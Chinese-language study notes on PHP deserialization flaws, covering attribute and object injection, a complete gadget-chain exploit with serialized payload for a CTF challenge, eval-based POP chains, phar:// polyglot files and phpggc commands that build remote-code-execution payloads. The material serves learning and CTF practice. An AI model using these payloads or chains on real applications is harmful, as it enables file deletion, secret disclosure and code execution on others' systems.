---
title: 'PHP反序列化笔记'
date: 2022-12-21 15:39:37
tags: [PHP,学习笔记]
published: true
hideInList: false
feature: 
isTop: false
---
# 反序列化

概念整理搬运工，都是看各类网上文章整理好久+自己的学习理解才发布的博文ovo 参考见文末，如果有落下欢迎指正。更新最新版见在个人notion，~~不懒的话有更新会及时同步到blog的233~~

## **概念**

**序列化**

将各数据类型,压缩为固定格式进行存储,使用的函数是`serialize()`

之所以需要序列化是因为PHP 文件在执行结束以后就会将对象销毁， 但如果销毁对象要随后使用则需要一种方式来长久保存.

序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法。

> 官方解释：
> 
> 1. [serialize](https://www.php.net/manual/en/function.serialize.php) - Generates a storable representation of a value.
> 2. [unserialize](https://www.php.net/manual/en/function.unserialize.php) - Creates a PHP value from a stored representation.

**反序列化**

**将用户可控的数据进行了反序列化**，就是PHP反序列化漏洞。

PHP 反序列化漏洞又叫做 PHP 对象注入漏洞,

实现反序列化注入

- `unserialize()`
- 使用协议 `phar://`

## **序列化后的格式**

![https//picture1253331270cosapbeijingmyqcloudcom/%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%93%E6%9E%9C1png](https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%93%E6%9E%9C1.png)

- public:
  - 长度 = 变量名的字符数量如实
- private:
  - ``%00类名%00属性名`
  - 长度 = 变量名的长度+类名的长度+2(两个长度的%00)
- protected:
  - `%00*%00属性名`
  - 长度 = 变量名 + 3

## **产生的原因**

参数可控

## Injection Types

来源：[https://www.xanhacks.xyz/p/php-gadget-chain/](https://www.xanhacks.xyz/p/php-gadget-chain/) 是德国的大佬ovo （想看文章所指的[DG’hAck](https://www.dghack.fr/)  2022 edition.，结果都是德文呜呜。

### Attribute injection

**什么是属性注入？**

属性注入是指的是，攻击者有可能修改一个instance的属性（attribute）的值。

**如何实现属性注入？**

```python
<?php

class User {

    public string $username;
    public bool $isAdmin;

    public function __construct(string $username)
    {
        $this->username = $username;
        $this->isAdmin = false;
    }

}

$user = new User("toto");
$data = serialize($user);

echo $data;
```

这里实例instance是 `$user` （是class User的instance）。

属性有

- username
- isAdmin

如果这里攻击者能够操作isAdmin为true的话，便可以导致access control问题

序列化后为

```python
O:4:"User":2:{s:8:"username";s:4:"toto";s:7:"isAdmin";b:0;}
```

攻击者可以修改 isAdmin为1

```python
O:4:"User":2:{s:8:"username";s:4:"toto";s:7:"isAdmin";b:1;}
```

### Object injection

**属性注入是什么？有什么危害**

不同于直接修改object下的属性，还有一种可能是反序列化其他object的instance。这可能会导致code execution,file writing or reading,calling a protected function…..

**如何实现属性注入**

为了实现这一点，我们要用到gadgets（帮助攻击者实现特定目的）： application代码里已有的PHP gadgets ， 或者，存在于PHP libraries的PHP gadgets。

总之，实现object injection需要：

- 一个PHP gadgets
- 可能会用到魔术方法（Magic methods）：参考笔记后面标题

举例子的话，比如有以下php代码位于application中

```python
class FileManager {

  public string $filePath;

  public function __construct(string $filePath)
  {
    $this->filePath = $filePath;
  }

  // ...

  public function __destruct()
  {
    echo "The file " . $this->filePath . " will be deleted." . PHP_EOL;
    unlink($this->filePath);
  }

}
```

这里 `_desturct` 在instance被消除时自动调用（被garbage collector调用）：自动调用时会调用函数下的 `unlink` 删除指定的filePath，所以攻击者可以构造如下payload，实现删除任意文件

```python
unserialize('O:11:"FileManager":1:{s:8:"filePath";s:9:"/tmp/toto";}');
```

**安全研究方向？**

安全研究者会研究Symfony, Laravel, ZendFramework, … 这类的PHP libraries，去寻找gadgets

### 更多的Object injection案例：[DG’hAck](https://www.dghack.fr/)2022 edition

背景提要：攻击者要审计该web服务器上的源代码，从而获取访问权限的方法……目标是config.php文件。

网站地址：[http://unserialkiller2.chall.malicecyber.com/](http://unserialkiller2.chall.malicecyber.com/)

config.php文件内容

```python
if (isset($_REQUEST["data"])) {
  try {
    $decoded = base64_decode($_REQUEST["data"]);
    $data = unserialize($decoded);
  } catch (\Throwable $t) {
    var_dump($t);
  }
}
```

第一条gadgets位于： ./app/vendor/guzzlehttp/psr7/src/Stream.php下名为Stream的 class中

```php
public function __destruct()
{
    $this->customMetadata->closeContent($this->size);
}
```

这里closeContent没有被定义。可以调用魔术方法 `__call`

第二条gadget位于：./app/vendor/guzzlehttp/psr7/src/StreamDecoratorTrait.php 下的名为`StreamDecoratorTrait` 的 Trait中 → 被CachingStream这个类继承

```php
public function __call($method, array $args)
{
    $result = null;
    if (is_object($this->stream) && method_exists($this->stream, "decorate")) { //must be true class FnStream
        if (in_array($method, $this->getAllowedMethods()) !== true) {
            $method = $this->custom_method;
        }
        if (is_array($method) !== true) {
            $method = [$method];
        }

        $args = $args[0];

        foreach ($method as $_method) {
            if (is_callable([$this->stream, $_method])) {
                $arguments = array_shift($args);
                $result = $this->stream->$_method(...$arguments);
            }
        }
    }
    // Always return the wrapped object if the result is a return $this
    return $result === $this->stream ? $this : $result;
}
```

这里 `$method` 带入为 `closeContent`
因为closeContent不位于getAllowedMethods(),所以最后 `$method` 将等于 `$this->custom_method`

第三条gadget 位于./app/vendor/guzzlehttp/psr7/src/FnStream.php 的FnStream（包含名为decorate的方法）

该类有

- decorate 方法
- getContents 方法 ： 读取php文件

```php
public function getContents()
{
  $content = "";
  if (isset($this->_fn_getContents) && is_string($this->_fn_getContents)) {
    $file = __DIR__ . $this->_fn_getContents . ".php";
    if ($this->display_content === true) {
      readfile($file);
      echo "Printing interesting file..." . PHP_EOL;
    }
  }
  retur
```

> `display_content` must be set to `true`.
> 
> `_fn_getContents` must be set to `/../../../../config` (relative path from the `FnStream.php` file path).
> 
> 所以最后：
> 
> $file = "./app/vendor/guzzlehttp/psr7/src" . "/../../../../config" . ".php";
> 
> $file = "./app/config.php";

这里，我们本可以设置 `display_content` 为true，且构造特定的 `_fn_getContents` 。但是不幸的是FnStream有一个魔术方法 `__wakeup` ，用来unset它的类下的全部attribute。这里不能直接设置attribute的值，而刚好，FnStream类下有一个叫做 `register` 的方法允许我们去设置attribute。

```php
public function register(string $name, $callback)
{
  if (in_array($name, self::$forbidden_attributes) === true) {
    throw new \LogicException('FnStream should never register this attribute: ' . $name);
  }
  $this->{$name} = $callback;
  $this->methods[] = [$name, $callback];
}
```

同时， `_fn_getContents` 在 `forbidden_attributes` 内，这里我们调用 `allow_attribute` 的方法去移除限制

```php
public function allow_attribute(string $name)
{
  if (in_array($name, self::$forbidden_attributes, true) === true) {
    $offset = array_search($name, self::$forbidden_attributes, true);
    unset(self::$forbidden_attributes[$offset]);
  }
}
```

也就是说gadget第3条需要调用这两个方法来移除限制。

所有的利用链串在一起，目标是读取config文件，即第三条gadget下我们设想的 `$file` 应该的值。

首先函数调入点（入口在这里）是第一条gadget： `__desstruct() `发现没有定义`$this->customMetadata` 下的`closeContent`，则进行调用  `$this→customMetadata` 的 ` _call`函数 （在调用 `_call`函数前，注意会先调用 `__construct` 方法. 这里把`$this→customMetadata`设置为CachingStream，并且实现trait `StreamDecoratorTrait` 。

在调用 `__call` 函数前，先在 `__construct` 下设置：

- `$this->stream`
- `$this->custom_method`

从而满足第二条gadget下的条件。最后第二条gadget触发，调用 `$this->custom_method` 数组内的function （定义在实现该trait的`Fnstream` class内。即第三条gadget下的register，allow_attribute等方法）。

最后的代码是

```php
<?php

namespace GuzzleHttp\Psr7;

class FnStream {

    private static $forbidden_attributes = [
        "_fn___toString",
        "_fn_close",
        "_fn_detach",
        "_fn_getSize",
        "_fn_tell",
        "_fn_eof",
        "_fn_isSeekable",
        "_fn_rewind",
        "_fn_seek",
        "_fn_getContents",
        "_fn_isWritable",
        "_fn_write",
        "_fn_isReadable",
        "_fn_read",
        "_fn_getMetadata"
    ];

    public function register(string $name, $callback)
    {
        if (in_array($name, self::$forbidden_attributes) === true) {
            throw new \LogicException('FnStream should never register this attribute: ' . $name);
        }
        $this->{$name} = $callback;
        $this->methods[] = [$name, $callback];
    }

    public function allow_attribute(string $name)
    {
        if (in_array($name, self::$forbidden_attributes, true) === true) {
            $offset = array_search($name, self::$forbidden_attributes, true);
            unset(self::$forbidden_attributes[$offset]);
        }
    }

    public function __wakeup()
    {
        unset($this->_fn_getMetadata);
        unset($this->_fn_close);
        unset($this->_fn_detach);
        unset($this->_fn_eof);
        unset($this->_fn_isSeekable);
        unset($this->_fn_rewind);
        unset($this->_fn___toString);
        unset($this->_fn_seek);
        unset($this->_fn_isWritable);
        unset($this->_fn_write);
        unset($this->_fn_getContents);
        unset($this->_fn_getSize);
        unset($this->_fn_tell);
        unset($this->_fn_isReadable);
        unset($this->_fn_read);
        echo "Disabling easy peasy attributes" . PHP_EOL;
    }

    public function getContents()
    {
        $content = "";
        if (isset($this->_fn_getContents) && is_string($this->_fn_getContents)) {
            $file = __DIR__ . $this->_fn_getContents . ".php";
            if ($this->display_content === true) {
                readfile($file);
                echo "Printing interesting file..." . PHP_EOL;
            }
        }
        return $content;
    }

    public static function decorate() {}
}

use ReflectionMethod;

trait StreamDecoratorTrait {
    public function __call($method, array $args)
    {
        $result = null;
        if (is_object($this->stream) && method_exists($this->stream, "decorate")) {
            if (in_array($method, $this->getAllowedMethods()) !== true) {
                $method = $this->custom_method;
            }
            if (is_array($method) !== true) {
                $method = [$method];
            }

            $args = $args[0];

            foreach ($method as $_method) {
                if (is_callable([$this->stream, $_method])) {
                    $arguments = array_shift($args);
                    $result = $this->stream->$_method(...$arguments);
                }
            }
        }
        // Always return the wrapped object if the result is a return $this
        return $result === $this->stream ? $this : $result;
    }

    public function getAllowedMethods($filter = array('close'))
    {
        $classReflection = new \ReflectionClass("GuzzleHttp\Psr7\FnStream");
        $methodsReflections = $classReflection->getMethods();
        $methodNames = array_map(function (ReflectionMethod $methodReflection) {
            return $methodReflection->getName();
        }, array_values($methodsReflections));
        $methodNames = array_diff($methodNames, $filter);
        return $methodNames;
    }
}

class CachingStream
{
    use StreamDecoratorTrait;

    public function __construct()
    {
        $this->stream = new FnStream();
        $this->custom_method = array("register", "allow_attribute", "register", "getContents");
    }
}

class Stream {
    public $size;
    public $customMetadata;

    public function __construct()
    {
        $this->size = array(
            array("display_content", true),
            array("_fn_getContents"),
            array("_fn_getContents", "/../../../../config"),
            array()
        );
        $this->customMetadata = new CachingStream();
    }

    public function __destruct()
    {
        $this->customMetadata->closeContent($this->size);
    }
}

$GENERATE = true;

if ($GENERATE) {
    $stream = new Stream();
    $data = serialize($stream);

    echo $data . PHP_EOL;
    echo base64_encode($data) . PHP_EOL;
} else {
    $data = base64_decode("Tzo2OiJTdHJlYW0iOjI6e3M6NDoic2l6ZSI7YTo0OntpOjA7YToyOntpOjA7czoxNToiZGlzcGxheV9jb250ZW50IjtpOjE7YjoxO31pOjE7YToxOntpOjA7czoxNToiX2ZuX2dldENvbnRlbnRzIjt9aToyO2E6Mjp7aTowO3M6MTU6Il9mbl9nZXRDb250ZW50cyI7aToxO3M6MTk6Ii8uLi8uLi8uLi8uLi9jb25maWciO31pOjM7YTowOnt9fXM6MTQ6ImN1c3RvbU1ldGFkYXRhIjtPOjEzOiJDYWNoaW5nU3RyZWFtIjoyOntzOjY6InN0cmVhbSI7Tzo4OiJGblN0cmVhbSI6Mjp7czoxNToiX2ZuX2dldENvbnRlbnRzIjtzOjE5OiIvLi4vLi4vLi4vLi4vY29uZmlnIjtzOjE1OiJkaXNwbGF5X2NvbnRlbnQiO2I6MTt9czoxMzoiY3VzdG9tX21ldGhvZCI7YTo0OntpOjA7czo4OiJyZWdpc3RlciI7aToxO3M6MTU6ImFsbG93X2F0dHJpYnV0ZSI7aToyO3M6ODoicmVnaXN0ZXIiO2k6MztzOjExOiJnZXRDb250ZW50cyI7fX19");
    unserialize($data);
}
```

## **魔术方法**

> [Magic methods](https://www.php.net/manual/en/language.oop5.magic.php) are special methods which override PHP’s default’s action when certain actions are performed on an object.

### 一览:

是一种在类序列化或反序列化中自动完成的一些操作.

(1**)**construct()**：**当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。
(2)wakeup() ：unserialize()时会自动调用
(3)destruct()：当对象被销毁时会自动调用。
(4)toString():当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用
(5)get() **:**当从不可访问的属性读取数据
(6)call(): 在对象上下文中调用不可访问的方法时触发

(7)sleep():在一个对象被序列化之前调用；

### destruct举例

案例1: 修改destruct下的变量为另一类

原始代码如下:

```php
<?php
class K0rz3n {
    private $test;
    public $K0rz3n = "i am K0rz3n";
    function __construct() {
        $this->test = new L();
    }

    function __destruct() {
        $this->test->action();
    }
}

class L {
    function action() {
        echo "Welcome to XDSEC";
    }
}

class Evil {

    var $test2;
    function action() {
        eval($this->test2);
    }
}

unserialize($_GET['test']);
```

查找后的共同点如下:

- 发现`Evil`类调用了action方法(使用了eval)
- `K0rz3n` 类在`destruct` 下自动调用了test下的action方法

入手点:

- 修改construct下的test

修改后的`K0rz3n` 类如下:

```php
<?php
class K0rz3n {
    private $test;
    function __construct() {
        $this->test = new Evil;
    }
}

class Evil {

    var $test2 = "phpinfo();";

}
```

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2022_12/Untitleda_0.png)

## POP链

POP 面向属性编程(Property-Oriented Programing)

**概念**

**从现有运行环境**中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的

### 案例

如下文章

- [https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/](https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)

## phar://

[https://paper.seebug.org/680/](https://paper.seebug.org/680/)

简述:phar触发反序列化漏洞的机理主要是由于:phar文件会存储用户自定义的meta-data.

### 敏感函数

- `file_exists()`
- `is_dir()`

更多:

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2022_12/Untitled%201a_1.png)

### 触发前提

- php.ini 下的 `phar.readonly` 设置为 `off`

### 文件结构

由四部分组成:

- stub :格式固定,必须以 `xxx<?php xxx; HALT_COMPILER();?>` 必须以 `__HALT_COMPILER();?> 结尾
- manifest: 被压缩文件的权限,属性等信息.以序列化的形式存储用户自定义的meta-data
- contents: 被压缩文件的内容
- signature: 签名,放文末

### 示例

```reason
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

### 伪造其他格式文件

因为phar文件被php识别主要是:

- 文件头stub
- `__HALT_COMPILER();?>`

所以只需要:

- 添加任意文件头
- 修改后缀名

示例

```reason
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

示例增加了Gif文件头 `GIF89a`

![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2022_12/Untitled%202a_2.png)

如图,生成的phar文件被识别为gif,修改后缀的poc可以参考hackerone的报告:[https://hackerone.com/reports/921288](https://hackerone.com/reports/921288)

### phar:// 自动化生成工具

可以使用phpgcc

具体参考文章:[https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A](https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A)

**生成phar文件,并将反序列化利用链插入**

```bash
php phpggc -o evil.phar Monolog/RCE6 system id
```

**伪造图片格式**

参数 `-pj`

```bash
php phpggc -pj example.jpg -o evil.jpg Monolog/RCE6 system whoami
```

### 限制条件

phar:// 反序列化利用,遇到以下几个条件会受限:

- php 8.0 及以上
- phar文件伪造图片格式,如果图片使用GD库处理过,则phar内容会被处理掉.

### PHP解析phar所支持的文件格式

一共支持三种:

- zip
  - 文件头尾都可以有脏数据,通过修复偏移量获得一个合法的zip文件(取决于zip解析器,phar解析器会检查文件头格式)
- tar
  - 控制文件头,即可构造合法的tar文件,即使文件尾有垃圾字符
- phar
  - 必须控制文件尾，但不需要控制文件头。PHP在解析时会在文件内查找`<?php __HALT_COMPILER(); ?>`
    这个标签，这个标签前面的内容可以为任意值，但后面的内容必须是phar格式，并以该文件的sha1签名与字符串`GBMB`
    结尾。

### 不同场景下使用phar

- 使用了less扩展(向后兼容的CSS扩展语言):
  - 利用文章:[https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A](https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A)

## Reference

笔记&反序列化教程：

- [https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/](https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)
- [https://paper.seebug.org/680/](https://paper.seebug.org/680/)
- [https://www.xanhacks.xyz/p/php-gadget-chain/](https://www.xanhacks.xyz/p/php-gadget-chain/)
- [https://portswigger.net/web-security/deserialization](https://portswigger.net/web-security/deserialization)
- [https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A](https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A)

不错的report （待补充收集）

- [https://hackerone.com/reports/921288](https://hackerone.com/reports/921288)